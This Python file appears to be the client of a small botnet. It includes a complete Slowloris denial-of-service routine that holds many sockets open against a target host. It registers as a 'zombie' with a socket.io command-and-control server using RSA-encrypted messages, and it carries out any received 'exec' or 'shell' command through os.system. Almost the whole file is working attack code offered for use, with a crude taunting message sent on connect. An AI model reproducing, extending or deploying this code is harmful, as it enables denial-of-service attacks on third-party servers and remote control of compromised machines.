import socketio
import os
import hashlib
import json
import time
import base64

import logging
import random
import socket
import sys
import time

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidSignature

sio = socketio.Client()

def generate_key_pair():
    key_size = 2048  

    private_key = rsa.generate_private_key(
        key_size=key_size,
        public_exponent=65537
    )

    public_key = private_key.public_key()
    return private_key, public_key

def export_public_key(public_key):
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')

def import_public_key(pem_data):
    return serialization.load_pem_public_key(pem_data.encode('utf-8'))

private_key, public_key = generate_key_pair()


# DDoS Module
# ----------------

def slowloris(host, port=80, sockets=150, verbose=False, randuseragent=False, useproxy=False, proxy_host="127.0.0.1", proxy_port=8080, https=False, sleeptime=15):
    if useproxy:
        try:
            import socks
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
            socket.socket = socks.socksocket
            logging.info("Using SOCKS5 proxy for connecting...")
        except ImportError:
            logging.error("Socks Proxy Library Not Available!")
            return

    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if verbose else logging.INFO,
    )

    def send_line(self, line):
        line = f"{line}\r\n"
        self.send(line.encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")

    if https:
        logging.info("Importing ssl module")
        import ssl
        setattr(ssl.SSLSocket, "send_line", send_line)
        setattr(ssl.SSLSocket, "send_header", send_header)

    setattr(socket.socket, "send_line", send_line)
    setattr(socket.socket, "send_header", send_header)

    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

    list_of_sockets = []

    def init_socket(ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((ip, port))

        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

        ua = user_agents[0]
        if randuseragent:
            ua = random.choice(user_agents)

        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")
        return s

    def slowloris_iteration():
        logging.info("Sending keep-alive headers...")
        logging.info("Socket count: %s", len(list_of_sockets))

        for s in list(list_of_sockets):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                list_of_sockets.remove(s)

        diff = sockets - len(list_of_sockets)
        if diff <= 0:
            return

        logging.info("Creating %s new sockets...", diff)
        for _ in range(diff):
            try:
                s = init_socket(host)
                if not s:
                    continue
                list_of_sockets.append(s)
            except socket.error as e:
                logging.debug("Failed to create new socket: %s", e)
                break

    logging.info("Attacking %s with %s sockets.", host, sockets)

    logging.info("Creating sockets...")
    for _ in range(sockets):
        try:
            s = init_socket(host)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", sleeptime)
        time.sleep(sleeptime)

# End DDos Module

@sio.event
def public_key_received(data):
    
    print(data)
    global public_key
    public_key = import_public_key(data)
    print("Public key received.")
    sio.emit('client_key_to_server', export_public_key(public_key))
    send_encrypted_message('message Hello from zombie!')
    send_encrypted_message('message USBO WAS FUCKING HERE BITCH!')

def encrypt(message: str) -> str:
    global public_key

    enc = public_key.encrypt(
        message.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return base64.b64encode(enc).decode('utf-8')

def send_encrypted_message(message):

    if public_key == None:
        return print('No public key')

    encoded_data = encrypt(message)
    a_hash = hashlib.sha256(message.encode('utf-8'))

    data = {
        'encrypted_message': encoded_data,
        'message_hash': a_hash.hexdigest()
    }
    
    sio.emit('message', json.dumps(data))

    
def decrypt(encrypted_data: str, message_hash: str) -> str:
    global private_key
    
    encrypted_bytes = base64.b64decode(encrypted_data)

    decrypted_data = private_key.decrypt(
        encrypted_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    decrypted_message = decrypted_data.decode('utf-8')

    calculated_hash = hashlib.sha256(decrypted_message.encode()).hexdigest()

    if calculated_hash == message_hash:
        return decrypted_message
    else:
        raise ValueError("Hash non valido, messaggio corrotto")

@sio.event
def connect():
    global sio
    print('Connection established')
    sio.emit('client_key_to_server', export_public_key(public_key))
    print('Public key sent to server')

def ping(args):
    send_encrypted_message('message Pinged zombie!')

def shell(args):
    return os.system(' '.join(args[1:]))

@sio.event
def message(data):
    print(f"Ricevuto data: {data}")
    if isinstance(data, str):
        data = json.loads(data)

    encrypted_data = data['encrypted_message']
    received_hash = data['message_hash']
    
    try:
        decrypted_message = decrypt(encrypted_data, received_hash)
        print(f"Messaggio decifrato: {decrypted_message}")
        
        
        command = decrypted_message.split(' ')
        commands = [
            {
                'name': ['ping', 'check', 'hello'],
                'callback': ping,
            },
            {
                'name': ['exec', 'shell'],
                'callback': shell,
            }
        ]
        
        for cmd in commands:
            if command[0].replace('-all', '') in cmd['name']:
                cmd['callback'](command)
                
    except ValueError as e:
        print(f"Errore durante la decifrazione: {e}")


    
            

@sio.event
def disconnect():
    print('Disconnected from server')

def main():
    sio.connect('http://localhost:3000')
    sio.wait()

if __name__ == '__main__':
    main()
